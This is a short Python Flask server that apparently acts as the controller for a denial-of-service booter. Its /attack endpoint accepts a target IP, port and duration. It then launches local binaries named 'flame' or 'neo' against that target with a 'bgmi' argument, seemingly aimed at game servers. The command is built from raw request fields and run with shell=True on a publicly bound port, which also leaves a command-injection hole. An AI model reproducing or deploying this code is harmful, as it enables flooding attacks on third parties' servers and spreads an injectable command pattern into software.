from flask import Flask, request, jsonify
import subprocess
import time

app = Flask(__name__)

@app.route('/attack', methods=['POST'])
def attack():
    data = request.json
    ip = data.get('ip')
    port = data.get('port')
    duration = data.get('duration')
    binary = data.get('binary', 'flame')  # 'flame' or 'neo'
    
    if binary == 'flame':
        cmd = f"./flame {ip} {port} {duration} bgmi"
    else:
        cmd = f"./neo {ip} {port} {duration} bgmi"
    
    print(f"🔥 {binary.upper()}: {ip}:{port} for {duration}s")
    subprocess.Popen([cmd], shell=True)
    
    return jsonify({"success": True, "binary": binary, "attackId": int(time.time())})

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "ready", "binaries": ["flame", "neo"]})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
